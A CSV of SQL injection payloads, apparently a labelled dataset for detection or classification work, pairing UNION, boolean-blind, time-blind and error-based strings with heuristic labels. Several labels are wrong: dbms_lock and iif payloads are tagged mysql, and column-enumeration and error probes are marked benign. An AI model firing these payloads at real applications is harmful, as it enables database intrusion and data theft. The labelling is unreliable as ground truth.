id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
22221,"1, ( begin if ( 8340 = 8340 ) then dbms_lock.sleep ( 5 )",time_blind,mysql,1.0,"Signals: 'dbms_lock', 'sleep', 'if'; Time-blind SQLi (sleep/delay function); DB: mysql",2
22239,"1 ) as vzyk where 5103 = 5103 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
22257,"1' ) as pkis where 3446 = 3446 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
22203,1 order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 13 chars.,2
22267,-4324 order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 18 chars.,2
22300,"1' where 4150 = 4150 and elt ( 8012 = 6026,6026 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
22301,"1,iif ( 6333 = 1227,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 27 chars.,2
22338,"waitfor delay '0:0:5' and ""cvqn"" like ""cvqn",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
22370,1%' ) waitfor delay '0:0:5' and ( '%' = ',time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
22384,"iif ( 4460 = 1610,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
22201,"1'+ ( select 'tzey' where 4491 = 4491 union all select null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 96 chars.,2
22205,-9340 ) where 5462 = 5462 or 3038 = 3038,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 40 chars.,2
22207,"-6405 ) as ilah where 5145 = 5145 union all select 5145,5145,5145,5145,5145--",union_based,generic,0.7,UNION-based payload detected. Payload length: 77 chars.,2
22216,"1' ) ) union all select null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 65 chars.,2
22227,1%' ) ) and 4595 = 4595#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 24 chars.,2
22231,1%' ) ) and 2006 = 2006,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
22232,"1%"" ) union all select null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 64 chars.,2
22243,"-1692' ) union all select 7074,7074,7074,7074,7074,7074,7074#",union_based,generic,0.7,UNION-based payload detected. Payload length: 61 chars.,2
22250,-7345 ) union all select 3866#,union_based,generic,0.7,UNION-based payload detected. Payload length: 30 chars.,2
22251,"1 ) ) ) union all select null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 65 chars.,2
22263,"-6440 ) ) ) union all select 3316,3316,3316,3316,3316,3316,3316,3316,3316,3316--",union_based,generic,0.7,UNION-based payload detected. Payload length: 80 chars.,2
22264,"-9924 ) ) as zgqa where 2867 = 2867 union all select 2867,2867,2867,2867,2867,2867,2867,2867,2867,2867#",union_based,generic,0.7,UNION-based payload detected. Payload length: 103 chars.,2
22275,"1"" ) as xwnu where 6490 = 6490 union all select null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 79 chars.,2
22279,"-8754"" ) ) ) union all select 7391,7391,7391,7391,7391,7391,7391--",union_based,generic,0.7,UNION-based payload detected. Payload length: 66 chars.,2
22280,"-4406%' union all select 9599,9599,9599,9599#",union_based,generic,0.7,UNION-based payload detected. Payload length: 45 chars.,2
22286,"-6550' ) where 1675 = 1675 union all select 1675,1675,1675,1675,1675,1675,1675--",union_based,generic,0.7,UNION-based payload detected. Payload length: 80 chars.,2
22304,1' ) ) ) and 6991 = 5579,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 24 chars.,2
22309,"1' where 1093 = 1093 union all select null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 74 chars.,2
22321,"1' ) ) union all select null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 59 chars.,2
22323,"-3017"" ) ) as ljit where 9128 = 9128 union all select 9128,9128,9128,9128,9128--",union_based,generic,0.7,UNION-based payload detected. Payload length: 80 chars.,2
22327,"-4371' ) ) ) union all select 7465,7465,7465,7465,7465,7465,7465#",union_based,generic,0.7,UNION-based payload detected. Payload length: 65 chars.,2
22328,1 ) and 7533 = 7533,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 19 chars.,2
22329,"1 ) where 9371 = 9371 union all select null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
22331,1%' union all select null--,union_based,generic,0.7,UNION-based payload detected. Payload length: 27 chars.,2
22336,"-3667%' ) ) union all select 3560,3560,3560--",union_based,generic,0.7,UNION-based payload detected. Payload length: 45 chars.,2
22337,"-8655 ) where 3910 = 3910 union all select 3910,3910#",union_based,generic,0.7,UNION-based payload detected. Payload length: 53 chars.,2
22339,-5569' ) as cjaf where 3753 = 3753 union all select 3753#,union_based,generic,0.7,UNION-based payload detected. Payload length: 57 chars.,2
22343,"1%"" union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
22362,"-4915' union all select 1928,1928,1928,1928#",union_based,generic,0.7,UNION-based payload detected. Payload length: 44 chars.,2
22363,"1' in boolean mode ) union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 88 chars.,2
22365,"-3009'+ ( select 'gqbo' where 6915 = 6915 union all select 6915,6915--",union_based,generic,0.7,UNION-based payload detected. Payload length: 70 chars.,2
22371,"-4637' union all select 9361,9361,9361,9361,9361,9361,9361,9361#",union_based,generic,0.7,UNION-based payload detected. Payload length: 64 chars.,2
22375,-9178' ) or 9779 = 6351,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
22381,-3988' ) ) union all select 1113#,union_based,generic,0.7,UNION-based payload detected. Payload length: 33 chars.,2
22395,"1 ) as azdb where 4219 = 4219 union all select null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
22269,end--,benign,generic,0.5,. Payload length: 5 chars.,2
22361,1 ) ) ),benign,generic,0.5,. Payload length: 7 chars.,2
22253,1' rlike sleep ( 5 ) #,time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
22256,"1' ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'ngwt' = 'ngwt",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
22259,"1%' ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( '%' = '",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
22272,1%' ) ) rlike sleep ( 5 ) #,time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
22277,"1 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) )",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
22287,"1' ) where 1804 = 1804 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; Error-based SQLi (extractvalue/updatexml); DB: mysql",1
22308,"1"" and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
22314,"1' ) ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( ( 'aqdj' = 'aqdj",error_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; Error-based SQLi (extractvalue/updatexml); DB: mysql",1
22315,"1"" and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) )",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
22316,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ""pdqm"" like ""pdqm",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
22324,"1' ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 'dreq' = 'dreq",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
22340,1 ) where 9078 = 9078 rlike sleep ( 5 ) #,time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
22353,"1%' ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( '%' = '",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
22366,"1' ) where 1600 = 1600 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
22374,"1' ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
22390,"1"" ) where 7471 = 7471 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
22393,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and 'pczr' = 'pczr",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
22397,"1 ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( 9542 = 9542",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
22399,"1"" ) ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
22204,1 ) ) as xbii where 2262 = 2262 or sleep ( 5 ) --,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
22206,1' ) or sleep ( 5 ) and ( 'fizk' = 'fizk,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
22212,-4595' ) where 4892 = 4892 order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 39 chars.,1
22225,"1' or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and 'ntaw' = 'ntaw",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
